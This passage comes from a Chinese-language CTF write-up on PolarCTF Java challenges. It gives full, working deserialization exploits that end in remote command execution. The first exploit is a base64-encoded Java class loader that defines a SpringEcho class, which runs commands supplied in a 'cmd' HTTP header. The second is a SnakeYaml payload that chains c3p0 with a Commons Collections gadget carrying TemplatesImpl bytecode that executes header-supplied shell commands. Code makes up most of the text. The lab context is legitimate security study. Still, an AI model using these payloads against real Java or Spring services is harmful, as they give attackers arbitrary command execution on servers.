        String age = "yv66vgAAADQAVgoADgAiBwAjCAAkBwAlBwAmBwAnCQAoACkKAAQAKgoAKwAsCAAtCgAuAC8KADAAMQoAAgAyBwAzCAA0CgAoADUKACsANgoABAA3BwA4BwA5AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACnJlYWRPYmplY3QBAB4oTGphdmEvaW8vT2JqZWN0SW5wdXRTdHJlYW07KVYBAApFeGNlcHRpb25zBwA6BwA7BwA8BwA9AQAKU291cmNlRmlsZQEACkV2aWwxLmphdmEMABUAFgEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL1N0cmluZwEAAltCBwA+DAA/AEAMAEEAQgcAQwwARABFAQzIeXY2NnZnQUFBRFFBbHdvQUNRQThDZ0E5QUQ0S0FEMEFQd2dBUUFvQVFRQkNDQUJEQndCRUNnQUhBRVVIQUVZS0FFY0FTQWdBU1FnQVNnZ0FTd2dBVEFnQVRRb0FCd0JPQ0FCUENBQlFCd0JSQ2dCSEFGSUlBRk1JQUZRS0FGVUFWZ29BRXdCWENBQllDZ0FUQUZrSUFGb0lBRnNJQUZ3S0FBa0FYUWdBWGdjQVh3b0FZQUJoQ2dCZ0FHSUtBR01BWkFvQUlBQmxDQUJtQ2dBZ0FHY0tBQ0FBYUFnQWFRZ0FhZ2NBYXdvQUtnQnNCd0J0QndCdUFRQUdQR2x1YVhRK0FRQURLQ2xXQVFBRVEyOWtaUUVBRDB4cGJtVk9kVzFpWlhKVVlXSnNaUUVBQ0R4amJHbHVhWFErQVFBTlUzUmhZMnROWVhCVVlXSnNaUWNBUkFjQWJ3Y0FSZ2NBVVFjQWNBY0Fhd0VBQ2xOdmRYSmpaVVpwYkdVQkFBOVRjSEpwYm1kRlkyaHZMbXBoZG1FTUFDNEFMd2NBY1F3QWNnQnpEQUIwQUhVQkFEeHZjbWN1YzNCeWFXNW5abkpoYldWM2IzSnJMbmRsWWk1amIyNTBaWGgwTG5KbGNYVmxjM1F1VW1WeGRXVnpkRU52Ym5SbGVIUkliMnhrWlhJSEFIWU1BSGNBZUFFQUZHZGxkRkpsY1hWbGMzUkJkSFJ5YVdKMWRHVnpBUUFQYW1GMllTOXNZVzVuTDBOc1lYTnpEQUI1QUhvQkFCQnFZWFpoTDJ4aGJtY3ZUMkpxWldOMEJ3QnZEQUI3QUh3QkFFQnZjbWN1YzNCeWFXNW5abkpoYldWM2IzSnJMbmRsWWk1amIyNTBaWGgwTG5KbGNYVmxjM1F1VTJWeWRteGxkRkpsY1hWbGMzUkJkSFJ5YVdKMWRHVnpBUUFMWjJWMFVtVnpjRzl1YzJVQkFBcG5aWFJTWlhGMVpYTjBBUUFkYW1GMllYZ3VjMlZ5ZG14bGRDNVRaWEoyYkdWMFVtVnpjRzl1YzJVQkFBbG5aWFJYY21sMFpYSU1BSDBBZWdFQUpXcGhkbUY0TG5ObGNuWnNaWFF1YUhSMGNDNUlkSFJ3VTJWeWRteGxkRkpsY1hWbGMzUUJBQWxuWlhSSVpXRmtaWElCQUJCcVlYWmhMMnhoYm1jdlUzUnlhVzVuREFCK0FIOEJBQU5qYldRQkFBZHZjeTV1WVcxbEJ3Q0FEQUNCQUlJTUFJTUFoQUVBQTFkSlRnd0FoUUNHQVFBQ0wyTUJBQWN2WW1sdUwzTm9BUUFDTFdNTUFJY0FpQUVBQjNCeWFXNTBiRzRCQUJGcVlYWmhMM1YwYVd3dlUyTmhibTVsY2djQWlRd0FpZ0NMREFDTUFJMEhBSTRNQUk4QWtBd0FMZ0NSQVFBQ1hFRU1BSklBa3d3QWxBQ0VBUUFGWm14MWMyZ0JBQVZqYkc5dVpRRUFFMnBoZG1FdmJHRnVaeTlGZUdObGNIUnBiMjRNQUpVQWxnRUFDbE53Y21sdVowVmphRzhCQUJScVlYWmhMMmx2TDFObGNtbGhiR2w2WVdKc1pRRUFHR3BoZG1FdmJHRnVaeTl5Wldac1pXTjBMMDFsZEdodlpBRUFFMXRNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUJCcVlYWmhMMnhoYm1jdlZHaHlaV0ZrQVFBTlkzVnljbVZ1ZEZSb2NtVmhaQUVBRkNncFRHcGhkbUV2YkdGdVp5OVVhSEpsWVdRN0FRQVZaMlYwUTI5dWRHVjRkRU5zWVhOelRHOWhaR1Z5QVFBWktDbE1hbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5T3dFQUZXcGhkbUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjZ0VBQ1d4dllXUkRiR0Z6Y3dFQUpTaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BUR3BoZG1FdmJHRnVaeTlEYkdGemN6c0JBQWxuWlhSTlpYUm9iMlFCQUVBb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN1cweHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0tVeHFZWFpoTDJ4aGJtY3ZjbVZtYkdWamRDOU5aWFJvYjJRN0FRQUdhVzUyYjJ0bEFRQTVLRXhxWVhaaEwyeGhibWN2VDJKcVpXTjBPMXRNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNwVEdwaGRtRXZiR0Z1Wnk5UFltcGxZM1E3QVFBUloyVjBSR1ZqYkdGeVpXUk5aWFJvYjJRQkFBMXpaWFJCWTJObGMzTnBZbXhsQVFBRUtGb3BWZ0VBRUdwaGRtRXZiR0Z1Wnk5VGVYTjBaVzBCQUF0blpYUlFjbTl3WlhKMGVRRUFKaWhNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3QVFBTGRHOVZjSEJsY2tOaGMyVUJBQlFvS1V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3dFQUNHTnZiblJoYVc1ekFRQWJLRXhxWVhaaEwyeGhibWN2UTJoaGNsTmxjWFZsYm1ObE95bGFBUUFJWjJWMFEyeGhjM01CQUJNb0tVeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0FRQVJhbUYyWVM5c1lXNW5MMUoxYm5ScGJXVUJBQXBuWlhSU2RXNTBhVzFsQVFBVktDbE1hbUYyWVM5c1lXNW5MMUoxYm5ScGJXVTdBUUFFWlhobFl3RUFLQ2hiVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1V4cVlYWmhMMnhoYm1jdlVISnZZMlZ6Y3pzQkFCRnFZWFpoTDJ4aGJtY3ZVSEp2WTJWemN3RUFEbWRsZEVsdWNIVjBVM1J5WldGdEFRQVhLQ2xNYW1GMllTOXBieTlKYm5CMWRGTjBjbVZoYlRzQkFCZ29UR3BoZG1FdmFXOHZTVzV3ZFhSVGRISmxZVzA3S1ZZQkFBeDFjMlZFWld4cGJXbDBaWElCQUNjb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tVeHFZWFpoTDNWMGFXd3ZVMk5oYm01bGNqc0JBQVJ1WlhoMEFRQU5aMlYwVTNSaFkydFVjbUZqWlFFQUlDZ3BXMHhxWVhaaEwyeGhibWN2VTNSaFkydFVjbUZqWlVWc1pXMWxiblE3QUNFQUxBQUpBQUVBTFFBQUFBSUFBUUF1QUM4QUFRQXdBQUFBSFFBQkFBRUFBQUFGS3JjQUFiRUFBQUFCQURFQUFBQUdBQUVBQUFBRkFBZ0FNZ0F2QUFFQU1BQUFBaXNBQ1FBTEFBQUJZN2dBQXJZQUF4SUV0Z0FGU3lvU0JnTzlBQWUyQUFoTUt3RUR2UUFKdGdBS1RiZ0FBcllBQXhJTHRnQUZTeW9TREFPOUFBZTJBQWhNS2hJTkE3MEFCN1lBQ0U0ckxBTzlBQW0yQUFvNkJDMHNBNzBBQ2JZQUNqb0Z1QUFDdGdBREVnNjJBQVVTRHdPOUFBZTJBQkE2QnJnQUFyWUFBeElSdGdBRkVoSUV2UUFIV1FNU0UxTzJBQkE2QnhrSEJMWUFGQmtHQkxZQUZCa0dHUVFEdlFBSnRnQUtPZ2daQnhrRkJMMEFDVmtERWhWVHRnQUt3QUFUT2drR3ZRQVRPZ29TRnJnQUY3WUFHQkladGdBYW1RQVNHUW9ERWhWVEdRb0VFaHRUcHdBUEdRb0RFaHhUR1FvRUVoMVRHUW9GR1FsVEdRaTJBQjRTSHdTOUFBZFpBeElUVTdZQUVCa0lCTDBBQ1ZrRHV3QWdXYmdBSVJrS3RnQWl0Z0FqdHdBa0VpVzJBQ2EyQUNkVHRnQUtWeGtJdGdBZUVpZ0R2UUFIdGdBUUdRZ0R2UUFKdGdBS1Z4a0l0Z0FlRWlrRHZRQUh0Z0FRR1FnRHZRQUp0Z0FLVjZjQUNVc3F0Z0FyVjdFQUFRQUFBVmtCWEFBcUFBSUFNUUFBQUhJQUhBQUFBQWdBREFBSkFCY0FDZ0FoQUFzQUxRQU1BRGdBRFFCREFBNEFUZ0FQQUZrQUVBQnZBQkVBaWdBU0FKQUFFd0NXQUJRQW93QVZBTGdBRmdDK0FCY0F6Z0FZQU5RQUdRRGRBQnNBNHdBY0FPa0FIZ0R2QUI4QktRQWdBVUVBSVFGWkFDUUJYQUFpQVYwQUl3RmlBQ1VBTXdBQUFEWUFCUDhBM1FBTEJ3QTBCd0ExQndBMkJ3QTFCd0EyQndBMkJ3QTFCd0ExQndBMkJ3QTNCd0E0QUFBTC93QnlBQUFBQVFjQU9RVUFBUUE2QUFBQUFnQTcHAEYMAEcASgcASwwATABNDABOAE8BABBqYXZhL2xhbmcvT2JqZWN0AQAKU3ByaW5nRWNobwwAUABRDABSAFMMAFQAVQEABUV2aWwxAQAUamF2YS9pby9TZXJpYWxpemFibGUBAB9qYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uAQAgamF2YS9sYW5nL0luc3RhbnRpYXRpb25FeGNlcHRpb24BACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgEAK2phdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQAQamF2YS91dGlsL0Jhc2U2NAEACmdldERlY29kZXIBAAdEZWNvZGVyAQAMSW5uZXJDbGFzc2VzAQAcKClMamF2YS91dGlsL0Jhc2U2NCREZWNvZGVyOwEAGGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcgEABmRlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBABRnZXRTeXN0ZW1DbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsAIQATAA4AAQAUAAAAAgABABUAFgABABcAAAAdAAEAAQAAAAUqtwABsQAAAAEAGAAAAAYAAQAAAAcAAgAZABoAAgAXAAAAlAAGAAYAAABkEgISAwe9AARZAxIFU1kEEgZTWQWyAAdTWQayAAdTtgAITSwEtgAJEgpOuAALLbYADDoELLgADQe9AA5ZAxIPU1kEGQRTWQUDuAAQU1kGGQS+uAAQU7YAEcAABDoFGQW2ABJXsQAAAAEAGAAAAB4ABwAAAAkAIgAKACcACwAqAAwAMwANAF0ADgBjAA8AGwAAAAoABAAcAB0AHgAfAAIAIAAAAAIAIQBJAAAACgABADAALgBIAAk=";
        UserBean userBean = new UserBean(name,age,map);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(userBean);
        objectOutputStream.close();
        byte[] serialize = byteArrayOutputStream.toByteArray();
        System.out.println(Base64.getEncoder().encodeToString(serialize));
    }
}
```

其中的age内容是Evil1.class的base64编码，而Evil1类的内容如下：

```java
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;

public class Evil1 implements Serializable {
    private void readObject(ObjectInputStream ois) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass",String.class, byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        String code = "yv66vgAAADQAlwoACQA8CgA9AD4KAD0APwgAQAoAQQBCCABDBwBECgAHAEUHAEYKAEcASAgASQgASggASwgATAgATQoABwBOCABPCABQBwBRCgBHAFIIAFMIAFQKAFUAVgoAEwBXCABYCgATAFkIAFoIAFsIAFwKAAkAXQgAXgcAXwoAYABhCgBgAGIKAGMAZAoAIABlCABmCgAgAGcKACAAaAgAaQgAagcAawoAKgBsBwBtBwBuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcARAcAbwcARgcAUQcAcAcAawEAClNvdXJjZUZpbGUBAA9TcHJpbmdFY2hvLmphdmEMAC4ALwcAcQwAcgBzDAB0AHUBADxvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5jb250ZXh0LnJlcXVlc3QuUmVxdWVzdENvbnRleHRIb2xkZXIHAHYMAHcAeAEAFGdldFJlcXVlc3RBdHRyaWJ1dGVzAQAPamF2YS9sYW5nL0NsYXNzDAB5AHoBABBqYXZhL2xhbmcvT2JqZWN0BwBvDAB7AHwBAEBvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5jb250ZXh0LnJlcXVlc3QuU2VydmxldFJlcXVlc3RBdHRyaWJ1dGVzAQALZ2V0UmVzcG9uc2UBAApnZXRSZXF1ZXN0AQAdamF2YXguc2VydmxldC5TZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIMAH0AegEAJWphdmF4LnNlcnZsZXQuaHR0cC5IdHRwU2VydmxldFJlcXVlc3QBAAlnZXRIZWFkZXIBABBqYXZhL2xhbmcvU3RyaW5nDAB+AH8BAANjbWQBAAdvcy5uYW1lBwCADACBAIIMAIMAhAEAA1dJTgwAhQCGAQACL2MBAAcvYmluL3NoAQACLWMMAIcAiAEAB3ByaW50bG4BABFqYXZhL3V0aWwvU2Nhbm5lcgcAiQwAigCLDACMAI0HAI4MAI8AkAwALgCRAQACXEEMAJIAkwwAlACEAQAFZmx1c2gBAAVjbG9uZQEAE2phdmEvbGFuZy9FeGNlcHRpb24MAJUAlgEAClNwcmluZ0VjaG8BABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAE1tMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARZ2V0RGVjbGFyZWRNZXRob2QBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQANZ2V0U3RhY2tUcmFjZQEAICgpW0xqYXZhL2xhbmcvU3RhY2tUcmFjZUVsZW1lbnQ7ACEALAAJAAEALQAAAAIAAQAuAC8AAQAwAAAAHQABAAEAAAAFKrcAAbEAAAABADEAAAAGAAEAAAAFAAgAMgAvAAEAMAAAAisACQALAAABY7gAArYAAxIEtgAFSyoSBgO9AAe2AAhMKwEDvQAJtgAKTbgAArYAAxILtgAFSyoSDAO9AAe2AAhMKhINA70AB7YACE4rLAO9AAm2AAo6BC0sA70ACbYACjoFuAACtgADEg62AAUSDwO9AAe2ABA6BrgAArYAAxIRtgAFEhIEvQAHWQMSE1O2ABA6BxkHBLYAFBkGBLYAFBkGGQQDvQAJtgAKOggZBxkFBL0ACVkDEhVTtgAKwAATOgkGvQATOgoSFrgAF7YAGBIZtgAamQASGQoDEhVTGQoEEhtTpwAPGQoDEhxTGQoEEh1TGQoFGQlTGQi2AB4SHwS9AAdZAxITU7YAEBkIBL0ACVkDuwAgWbgAIRkKtgAitgAjtwAkEiW2ACa2ACdTtgAKVxkItgAeEigDvQAHtgAQGQgDvQAJtgAKVxkItgAeEikDvQAHtgAQGQgDvQAJtgAKV6cACUsqtgArV7EAAQAAAVkBXAAqAAIAMQAAAHIAHAAAAAgADAAJABcACgAhAAsALQAMADgADQBDAA4ATgAPAFkAEABvABEAigASAJAAEwCWABQAowAVALgAFgC+ABcAzgAYANQAGQDdABsA4wAcAOkAHgDvAB8BKQAgAUEAIQFZACQBXAAiAV0AIwFiACUAMwAAADYABP8A3QALBwA0BwA1BwA2BwA1BwA2BwA2BwA1BwA1BwA2BwA3BwA4AAAL/wByAAAAAQcAOQUAAQA6AAAAAgA7";
        byte[] decodedBytes = Base64.getDecoder().decode(code);
        Class echo = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(),"SpringEcho",decodedBytes,0,decodedBytes.length);
        echo.newInstance();
    }
}
```

就是放了个简单的classloader过程，其中的code是SpringEcho类的base64编码，而SpringEcho就是个简单的回显，如下：

```java
import java.lang.reflect.Method;
import java.util.Scanner;

public class SpringEcho{
    static {
        try {
            Class v0 = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
            Method v1 = v0.getMethod("getRequestAttributes");
            Object v2 = v1.invoke(null);
            v0 = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
            v1 = v0.getMethod("getResponse");
            Method v3 = v0.getMethod("getRequest");
            Object v4 = v1.invoke(v2);
            Object v5 = v3.invoke(v2);
            Method v6 = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.ServletResponse").getDeclaredMethod("getWriter");
            Method v7 = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.http.HttpServletRequest").getDeclaredMethod("getHeader",String.class);
            v7.setAccessible(true);
            v6.setAccessible(true);
            Object v8 = v6.invoke(v4);
            String v9 = (String) v7.invoke(v5,"cmd");
            String[] v10 = new String[3];
            if (System.getProperty("os.name").toUpperCase().contains("WIN")){
                v10[0] = "cmd";
                v10[1] = "/c";
            }else {
                v10[0] = "/bin/sh";
                v10[1] = "-c";
            }
            v10[2] = v9;
            v8.getClass().getDeclaredMethod("println",String.class).invoke(v8,(new Scanner(Runtime.getRuntime().exec(v10).getInputStream())).useDelimiter("\\A").next());
            v8.getClass().getDeclaredMethod("flush").invoke(v8);
            v8.getClass().getDeclaredMethod("clone").invoke(v8);
        } catch (Exception var11) {
            var11.getStackTrace();
        }
    }
}
```

之后打就完了：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20241005200401282.png" alt="image-20241005200401282" style="zoom:50%;" />

别忘了urlencode编码一次，打完后接着打一个触发链，如下：

```java
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class Restart {
    public static void main(String[] args) throws IOException {
        Evil1 evil = new Evil1();
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(evil);
        objectOutputStream.close();
        byte[] serialize = byteArrayOutputStream.toByteArray();
        System.out.println(Base64.getEncoder().encodeToString(serialize));
    }
}
```

同时在head里加上cmd头和命令即可：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20241005200530205.png" alt="image-20241005200530205" style="zoom: 50%;" />

不过我这样打只能执行一次命令，然后就打不进去了，每次重启容器才能打一次命令，大概因为用的不是内存马，因此只能打出触发的那一次，如果要换内存马的话应该就可以了



### SnakeYaml

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20241006130614799.png" alt="image-20241006130614799" style="zoom:50%;" />

题目已经告诉我们要怎么打了

看看源码：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20241008220341612.png" alt="image-20241008220341612" style="zoom:67%;" />

就是个snakeyaml反序列化，再去看看依赖：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20241008220429537.png" alt="image-20241008220429537" style="zoom:67%;" />

有CC,CB,c3p0等，还有很多没截全

接下来直接打就行了：

```java
package snakeyaml;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.yaml.snakeyaml.Yaml;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.StringWriter;
import java.lang.reflect.Field;
import java.util.*;

public class snake_c3p0 {

    public static Map CC11() throws Exception {
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = getTemplate();
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);
        HashMap<Object,Object> map = new HashMap<>();
        Map<Object,Object> innerMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, templates);
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry, "bbb");
        innerMap.remove(templates);
        Class c = LazyMap.class;
        Field factoryField = c.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(innerMap,invokerTransformer);
        return hashMap;
    }
    public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws NoSuchFieldException, IllegalAccessException {
        Class clazz = obj.getClass();
        Field classField = clazz.getDeclaredField(fieldName);
        classField.setAccessible(true);
        classField.set(obj, fieldValue);
    }

    public static CtClass genPayloadForLinux() throws CannotCompileException, NotFoundException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass clazz = classPool.makeClass("A");
        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addConstructor(CtNewConstructor.make("public B() throws Exception {\n" +
                "                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n" +
                "                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n" +
                "                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n" +
                "                String[] cmd =  new String[]{\"sh\", \"-c\", httprequest.getHeader(\"C\")};\n" +
                "                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes();\n" +
                "                httpresponse.getWriter().write(new String(result));\n" +
                "                httpresponse.getWriter().flush();\n" +
                "                httpresponse.getWriter().close();\n" +
                "        }", clazz));
        // 兼容低版本jdk
        clazz.getClassFile().setMajorVersion(50);
        CtClass superClass = classPool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        return clazz;
    }

    public static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getTemplate() throws Exception {

        CtClass clz = genPayloadForLinux();
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl obj = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clz.toBytecode()});
        setFieldValue(obj, "_name", "a");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        return obj;
    }


    static void addHexAscii(byte b, StringWriter sw)
    {
        int ub = b & 0xff;
        int h1 = ub / 16;
        int h2 = ub % 16;
        sw.write(toHexDigit(h1));
        sw.write(toHexDigit(h2));
    }

    private static char toHexDigit(int h)
    {
        char out;
        if (h <= 9) out = (char) (h + 0x30);
        else out = (char) (h + 0x37);
        //System.err.println(h + ": " + out);
        return out;
    }

    //将类序列化为字节数组
    public static byte[] tobyteArray(Object o) throws IOException {
        ByteArrayOutputStream bao = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bao);
        oos.writeObject(o);
        return bao.toByteArray();
    }

    //字节数组转十六进制
    public static String toHexAscii(byte[] bytes)
    {
        int len = bytes.length;
        StringWriter sw = new StringWriter(len * 2);
        for (int i = 0; i < len; ++i)
            addHexAscii(bytes[i], sw);
        return sw.toString();
    }

    public static void main(String[] args) throws Exception {
        String hex = toHexAscii(tobyteArray(CC11()));
        String poc = "!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n" +
                "userOverridesAsString: HexAsciiSerializedMap:"+hex+";";
        System.out.println(poc);
   }
}
```

别忘了url编码，打完第一下是爆HTTP 500，之后就可正常执行命令了：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20241008220757264.png" alt="image-20241008220757264" style="zoom:50%;" />
